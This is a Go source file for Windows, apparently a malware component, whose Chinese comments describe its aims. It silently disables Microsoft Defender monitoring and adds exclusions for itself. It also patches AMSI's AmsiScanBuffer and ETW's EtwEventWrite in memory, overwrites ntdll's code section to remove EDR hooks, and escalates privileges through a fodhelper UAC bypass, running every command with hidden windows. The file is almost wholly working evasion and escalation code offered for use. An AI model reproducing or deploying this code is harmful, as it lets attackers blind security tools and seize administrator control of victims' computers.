//go:build windows

package main

import (
	"os/exec"
	"strings"
	"syscall"
)

// 关闭 Defender 实时监控、加排除项；没权限就静默跳过。
func neutralizeDefender() {
	cmds := [][]string{
		{"powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"},
		{"powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"},
		{"powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			"Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue"},
		{"powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			"Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue"},
		{"powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
			"Add-MpPreference -ExclusionProcess '" + selfName() + "' -ErrorAction SilentlyContinue"},
	}
	for _, c := range cmds {
		runHidden(c[0], c[1:]...)
	}
}

// AMSI 打补丁：AmsiScanBuffer 直接返回 E_INVALIDARG，任何脚本载荷都扫不出来。
func patchAMSI() bool {
	addr := moduleProc("amsi.dll", "AmsiScanBuffer")
	if addr == 0 {
		return false
	}
	// mov eax, 0x80070057 ; ret
	return patchMemory(addr, []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// ETW 打补丁：EtwEventWrite 直接返回 0，.NET/PS 的行为遥测全部哑火。
func patchETW() bool {
	addr := moduleProc("ntdll.dll", "EtwEventWrite")
	if addr == 0 {
		return false
	}
	// xor eax, eax ; ret
	return patchMemory(addr, []byte{0x33, 0xC0, 0xC3})
}

// 从磁盘重新加载一份干净的 ntdll 覆盖内存中的 .text，
// 把 EDR 用户态 hook 全部抹掉。
func unhookNtdll() bool {
	raw, err := readFileBytes(`C:\Windows\System32\ntdll.dll`)
	if err != nil || len(raw) < 0x400 {
		return false
	}
	peOff := int(le32(raw, 0x3C))
	if peOff <= 0 || peOff+0x100 > len(raw) {
		return false
	}
	optOff := peOff + 24
	magic := le16(raw, optOff)
	if magic != 0x20b {
		return false
	}
	secOff := optOff + 240
	nSec := int(le16(raw, peOff+6))
	if nSec <= 0 || nSec > 96 {
		return false
	}
	base := moduleBase("ntdll.dll")
	if base == 0 {
		return false
	}
	patched := 0
	for i := 0; i < nSec; i++ {
		o := secOff + i*40
		if o+40 > len(raw) {
			break
		}
		name := strings.TrimRight(string(raw[o:o+8]), "\x00")
		if name != ".text" {
			continue
		}
		vsz := int(le32(raw, o+8))
		rawSize := int(le32(raw, o+16))
		rawPtr := int(le32(raw, o+20))
		if vsz <= 0 || rawPtr <= 0 || rawPtr+rawSize > len(raw) {
			continue
		}
		chunk := rawSize
		if chunk > vsz {
			chunk = vsz
		}
		dst := base + uintptr(le32(raw, o+12))
		if patchMemory(dst, raw[rawPtr:rawPtr+chunk]) {
			patched++
		}
	}
	return patched > 0
}

func moduleBase(name string) uintptr {
	return moduleProc(name, "")
}

// 提权：fodhelper UAC 绕过（HKCU 劫持 ms-settings 协议，fodhelper 以自动提升方式拉起）
func uacBypass() bool {
	if isElevated() {
		return true
	}
	exe, err := ownPath()
	if err != nil {
		return false
	}
	key := `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	runHidden("reg", "add", key, "/ve", "/d", exe, "/f")
	runHidden("reg", "add", key, "/v", "DelegateExecute", "/d", "", "/f")
	runHidden("reg", "add", key, "/v", "DelegateExecute", "/f")
	runHidden(`C:\Windows\System32\fodhelper.exe`)
	runHidden("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f")
	return isElevated()
}

func isElevated() bool {
	_, err := exec.Command("net", "session").CombinedOutput()
	return err == nil
}

func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	return cmd.Run()
}
